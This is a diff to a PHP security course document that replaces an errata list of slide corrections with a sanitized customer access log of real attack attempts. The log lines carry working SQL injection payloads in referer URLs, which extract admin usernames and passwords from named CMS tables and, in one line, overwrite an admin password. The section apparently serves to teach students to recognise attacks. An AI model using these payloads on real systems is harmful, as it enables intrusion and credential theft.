@@ -1905,31 +1905,24 @@ if(isset($_GET['img'])) {
 ```
 ## ERRATA
 
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/2/16: syntax error in example!!!; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/3/7: dup; ???
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/3/10: founden; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/3/18: are your SQL statements influenced by user input?; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/3/75: s/be DO NOT include token in GET param; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/3/84: s/be a dot "." after "session"; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/3/102: accessability; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/4/4: extra ":" on 1st line; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/5: missing a graphic; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/5/6: show examples of these; OK
-* PDF page 177: smart quotes are causing weird characters to appear in the PDF creation; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/2/89: Create interfaces which tightly define; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/2/91: the whitelist might be subject to attack: maybe index of function names, not stored directly; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/4/3: get rid of "smart quote"!!! OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/4/11: get rid of "smart quote"!!! OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/4/11: don't use direct user input!  use value from whitelist instead; OK
-* file:///D:/Repos/PHP-Security/Course_Materials/index.html#/6/20: metasplit
-* LAB: IDSZ: in the URL you are asked to post via `curl` target s/be `http://securitytraining/`; OK
-* SDE Lab: ctype_alnum doesn't work in this context
-  * replaced with: `$username = preg_replace('/[^a-z0-9]/i', '', $_POST['username']);`
-* SDE Lab: need to add a password quality check before allowing the new user entry to be created
-  * added validation for both username and password
-* IFU Lab: need to have some kind way to link the random filename with the original: maybe a database entry; OK
-* LABS: Sensitive Data Exposure: looks like solution is not complete; esp ctype_alnum() not affecting validation; OK
-* SQLI Lab: solution: doesn't take into account 0 ID for admin; OK
-* CSRF Lab: javascript could read the DOM and pick up the hash, including it in the illegal posting; try to figure out a better prevention
-  * Added CAPTCHA
-
+## Actual Attacks from Customer Access Log (sanitized)
+```
+[Sun Jul 21 23:05:10 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/plus, referer: http://second.site.com//plus/ajax_common.php?act=hotword&query=%E9%8C%A6'%20a%3C%3End%201=2%20un%3C%3Eion%20sel%3C%3Eect%201,group_concat(0x23,0x23,0x23,admin_name,0x3a,pwd,0x3a,pwd_hash,0x23,0x23,0x23),3%20fr%3C%3Eom%20qs_admin%23%22
+[Sun Jul 21 23:05:11 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/plug, referer: http://second.site.com//plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user
+[Sun Jul 21 23:05:11 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/mx_form, referer: http://second.site.com//mx_form
+[Sun Jul 21 23:05:11 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/plus, referer: http://second.site.com//plus/recommend.php?aid=1
+[Sun Jul 21 23:05:12 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/admin, referer: http://second.site.com//admin/Images/del.gif
+[Sun Jul 21 23:05:12 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/admin, referer: http://second.site.com//admin/login/login_check.php?met_cookie_filter%5Ba%5D=a%27,admin_pass=md5(1234567)+where+id=1;+%23--
+[Sun Jul 21 23:05:12 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/wap, referer: http://second.site.com//wap/?action=show&mod=admin%20where%20userid=1%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(0x23,username,0x23,password,0x23)%20from%20la_admin%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23
+[Sun Jul 21 23:05:13 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/news, referer: http://second.site.com//news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(0x23,0x23,0x23,user,0x3a,password,0x23,0x23,0x23)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html
+[Sun Jul 21 23:05:13 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/news, referer: http://second.site.com//news/html/?410%27union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(0x23,0x23,0x23,user,0x3a,password,0x23,0x23,0x23)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where%271%27=%271.html
+[Sun Jul 21 23:05:13 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/f, referer: http://second.site.com//f/job.php?job=getzone&typeid=zone&fup=../../do%5Cjs&id=514125&webdb%5Bweb_open%5D=1&webdb%5Bcache_time_js%5D=-1&pre=qb_label%20where%20lid=-1%20UNION%20SELECT%201,2,3,4,5,6,0,concat%280x23,username,0x23,password,0x23%29,9,10,11,12,13,14,15,16,17,18,19%20from%20qb_members%20limit%201%23
+[Sun Jul 21 23:05:13 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/shopadmin, referer: http://second.site.com//shopadmin/index.php?ctl=passport&act=login&sess_id=1%27+and%28select+1+from%28select+count%28*%29,concat%28%28select+%28select+%28select+concat%28userpass,0x7e,username,0x7e,op_id%29+from+sdb_operators+Order+by+username+limit+0,1%29+%29+from+%60information_schema%60.tables+limit+0,1%29,floor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+%271%27=%271
+[Sun Jul 21 23:05:13 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/SiteServer, referer: http://second.site.com//SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest
+[Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/SiteFiles, referer: http://second.site.com//SiteFiles/Module/cms/logo.gif
+[Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/NewsType.asp, referer: http://second.site.com//NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''='
+[Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/install, referer: http://second.site.com//install/index.php?_m=frontpage&_a=setting&default_tpl=jixie-110118-a16
+[Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/Data21293, referer: http://second.site.com//Data21293/NYIKUGY5434231.mdb
+[Sun Jul 21 23:05:14 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/admin, referer: http://second.site.com//admin/review.asp?id=1%20union%20select%201,2,3,4,5,admin,7,8,9,password,11%20%20from%20cnhww
+[Sun Jul 21 23:05:15 2019] [error] [client 222.231.9.67] File does not exist: /var/www/vhosts/my.customer.com/httpdocs/admin, referer: http://second.site.com//admin/left.asp
+```
